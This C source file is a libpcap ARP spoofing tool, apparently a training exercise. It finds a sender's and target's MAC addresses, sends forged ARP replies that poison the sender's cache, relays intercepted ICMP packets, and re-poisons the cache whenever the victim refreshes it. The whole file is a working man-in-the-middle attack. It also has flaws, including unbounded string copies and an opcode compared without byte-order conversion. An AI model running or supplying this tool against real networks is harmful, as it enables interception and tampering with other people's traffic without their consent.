#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <pthread.h>
#include <time.h>

#define ARP_REQUEST 1
#define ARP_REPLY 2

struct arphdr{
	uint16_t hw_type;
	uint16_t pro_type;
	uint8_t hw_len;
	uint8_t pro_len;
	uint16_t opcode;
	uint8_t sdr_mac[6];
	uint8_t sdr_ip[4];
	uint8_t tar_mac[6];
	uint8_t tar_ip[4];
};

typedef struct host_info{
	u_char ip[20];
	uint8_t mac[6];
} HOST;


typedef struct param{
	u_char *dev;
	HOST *my;
	HOST *sdr;
	HOST *tar;
} PARAM;

void Init_arp(struct arphdr *arp, uint16_t opcode);
int Get_my_info(u_char *dev, HOST *host);
int Get_hwaddr_by_ip(u_char *dev, HOST *my, HOST *tar);
void Send_poisoned_arp(pcap_t *handle, u_char *dev, HOST *my, HOST *sdr, HOST *tar);
void capsulize_param(PARAM *param, u_char *dev, HOST *my, HOST *sdr, HOST *tar);
void *relay_packet(void *_param);


int main(int argc, char *argv[])
{
	HOST my;
	HOST sdr;
	HOST tar;
	u_char dev[10];
	pthread_t thread[2];
	PARAM param[2];
	uint32_t status[2];


	if (argc != 4) {
		printf("Usage : ./pcap_test [interface] [sender ip] [target ip]\n");
		return 2;
	}

	strcpy(dev, argv[1]);
	strcpy(sdr.ip, argv[2]);
	strcpy(tar.ip, argv[3]);

	if (!Get_my_info(dev, &my))
		return -1;

	if (!Get_hwaddr_by_ip(dev, &my, &sdr))
		return -1;

	if (!Get_hwaddr_by_ip(dev, &my, &tar))
		return -1;

	
	/* for sdr */
	capsulize_param(&param[0], dev, &my, &sdr, &tar);
	pthread_create(&thread[0], NULL, relay_packet, (void*)&param[0]);


	/* for tar */
	capsulize_param(&param[1], dev, &my, &tar, &sdr);
	pthread_create(&thread[1], NULL, relay_packet, (void*)&param[1]);


	pthread_join(thread[0], (void**)&status[0]);
	pthread_join(thread[1], (void**)&status[1]);

	return(0);
}


void Init_arp(struct arphdr *arp, uint16_t opcode)
{
	arp->hw_type = htons(1);	/* type Ethernet */
	arp->pro_type = htons(0x0800);	/* protocol IP */
	arp->hw_len = 6;
	arp->pro_len = 4;
	arp->opcode = htons(opcode);
}


int Get_my_info(u_char *dev, HOST *my)
{
	FILE *fp;
	int i;
	int fd;
	struct ifreq ifr;
	char hwaddr[20];

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

	/* Get my IP addr */
	ioctl(fd, SIOCGIFADDR, &ifr);	
	inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), my->ip, INET_ADDRSTRLEN);
	
	/* Get my mac addr */
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	memcpy(my->mac, ifr.ifr_hwaddr.sa_data, 6);
	
	close(fd);
	return 1;
}


/* Get HW address of tar */
int Get_hwaddr_by_ip(u_char *dev, HOST *my, HOST *tar)
{
	pcap_t *handle;			/* Session handle */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	char filter_exp[] = "arp";	/* The filter expression */
	bpf_u_int32 net;		/* Our IP */
	unsigned char send[50] = {0};	/* Buffer to send */
	unsigned char *recv;		/* Buffer to recv */
	uint32_t i;
	uint32_t cnt;
	uint32_t res;
	struct ethhdr ether;
	struct ethhdr *recv_ether;
	struct arphdr arp;
	struct arphdr *recv_arp;


	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, 65536, 0, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(0);
	}

	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(0);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(0);
	}


	/* set ethernet header */
	memcpy(ether.h_source, my->mac, 6);
	memcpy(ether.h_dest, "\xff\xff\xff\xff\xff\xff", 6);
	ether.h_proto = htons(ETHERTYPE_ARP);
	memcpy(send, (char*)&ether, 14);

	/* set arp header */
	Init_arp(&arp, ARP_REQUEST);
	inet_pton(AF_INET, my->ip, &arp.sdr_ip);
	inet_pton(AF_INET, tar->ip, &arp.tar_ip);
	memcpy(arp.sdr_mac, my->mac, 6);
	memcpy(arp.tar_mac, "\x00\x00\x00\x00\x00\x00", 6);
	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));


	for (cnt=0 ; cnt<10 ; cnt++) {
		/* Send arp request to sender */
		if (pcap_sendpacket(handle, send, 42))
		{
			fprintf(stderr, "Couldn't send packet\n");
			return 0;
		}
		printf("Send ARP request to %s\n", tar->ip);
		/* Recv arp reply */
		res = pcap_next_ex(handle, &header, (const u_char**)&recv);
		if (res==0)
			continue;
		else if (res==-1)
		{
			fprintf(stderr, "Couldn't recv packet\n");
			return 0;
		}

		recv_ether = (struct ethhdr*)recv;
		if (ntohs(recv_ether->h_proto) == ETHERTYPE_ARP)
		{
			recv_arp = (struct arphdr*)(recv + 14);
			if (ntohs(recv_arp->opcode) == ARP_REPLY && *(uint32_t*)arp.tar_ip == *(uint32_t*)recv_arp->sdr_ip)
			{
				printf("Get ARP Reply from %s\n", inet_ntoa(*(struct in_addr*)recv_arp->sdr_ip));
				memcpy(tar->mac, recv_arp->sdr_mac, 6);
				break;
			}
		}
	}
	pcap_close(handle);
	if (cnt == 10)
	{
		fprintf(stderr, "Couldn't recv reply (timeout)\n");
		return 0;
	}

	return 1;
}


/* spoof sdr's arp table : [tar_ip]-[my_mac] */
void Send_poisoned_arp(pcap_t *handle, u_char *dev, HOST *my, HOST *sdr, HOST *tar)
{
	//pcap_t *handle;			/* Session handle */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	int i;
	unsigned char send[50] = {0};	/* Buffer to send */
	struct ethhdr ether;
	struct arphdr arp;


	/* Open the session in promiscuous mode */
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return;
	}


	/* set ethernet header */
	memcpy(ether.h_source, my->mac, 6);
	memcpy(ether.h_dest, sdr->mac, 6);
	ether.h_proto = htons(ETHERTYPE_ARP);
	memcpy(send, (char*)&ether, 14);

	/* set arp header */
	Init_arp(&arp, ARP_REPLY);
	inet_pton(AF_INET, tar->ip, &arp.sdr_ip);
	inet_pton(AF_INET, sdr->ip, &arp.tar_ip);
	memcpy(arp.sdr_mac, my->mac, 6);
	memcpy(arp.tar_mac, sdr->mac, 6);
	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));

	printf("tar : %s\n", tar->ip);
	printf("sdr : %s\n", sdr->ip);

	
	/* Send arp request to sender */
	if (pcap_sendpacket(handle, send, 42))
	{
		fprintf(stderr, "Couldn't send packet\n");
		return;
	}
	printf("Send ARP Attack to %s!!\n\n", sdr->ip);
}



void capsulize_param(PARAM *param, u_char *dev, HOST *my, HOST *sdr, HOST *tar)
{
	param->dev = dev;
	param->my = my;
	param->sdr = sdr;
	param->tar = tar;
}



void *relay_packet(void *_param)
{
	pcap_t *handle;			/* Session handle */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	bpf_u_int32 net;		/* Our IP */
	char filter_exp[] = "ip or arp";	/* The filter expression */
	unsigned char *packet;		/* Buffer to recv */
	struct ethhdr *recv_ether;
	struct arphdr *recv_arp;
	struct ip *ip;
	PARAM *param = (PARAM *)_param;
	uint32_t res;
	uint32_t i;
	uint32_t size;


	/* Open the session in promiscuous mode */
	handle = pcap_open_live(param->dev, 65536, 0, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", param->dev, errbuf);
		pthread_exit((void *)0);
	}


	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		pthread_exit((void *)0);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		pthread_exit((void *)0);
	}

	Send_poisoned_arp(handle, param->dev, param->my, param->sdr, param->tar);


	while(1) {
		res = pcap_next_ex(handle, &header, (const u_char**)&packet);
		if (res==0)
			continue;
		else if (res==-1)
		{
			fprintf(stderr, "Couldn't recv packet\n");
			pthread_exit((void *)0);
		}

		recv_ether = (struct ethhdr*)packet;

		/* Relay IP packet */
		if (ntohs(recv_ether->h_proto) == ETHERTYPE_IP)
		{
			ip = (struct ip*)(packet + sizeof(struct ethhdr));
			if (ip->ip_p == IPPROTO_ICMP)
			{
				if (!memcmp(recv_ether->h_source, param->sdr->mac, 6))
				{
					printf("Get ICMP packet!\n");		
					/* change ethernet header info */
					memcpy(recv_ether->h_source, param->my->mac, 6);
					memcpy(recv_ether->h_dest, param->tar->mac, 6);
				
					size = sizeof(struct ethhdr) + ntohs(ip->ip_len);
					printf("size : %d\n\n", size); 
					/* Relay IP packet */
					if (pcap_sendpacket(handle, packet, size))
					{
						fprintf(stderr, "Couldn't send packet\n");
						pthread_exit((void *)0);
					}
				}
			}
		}
		/* Recover sdr's arp table */
		else if (ntohs(recv_ether->h_proto) == ETHERTYPE_ARP)
		{
			printf("Get ARP packet!\n");
			
			recv_arp = (struct arphdr*)(packet + 14);
			if (recv_arp->opcode == ARP_REQUEST)
				if (*(uint32_t*)recv_arp->sdr_ip == *(uint32_t*)param->sdr->ip)
					if (!memcmp(recv_ether->h_dest, "\xff\xff\xff\xff\xff\xff", 6) || !memcmp(recv_ether->h_dest, param->my->mac, 6))
						Send_poisoned_arp(handle, param->dev, param->my, param->sdr, param->tar);
		}
	}

	pcap_close(handle);
	pthread_exit((void *)0);
}
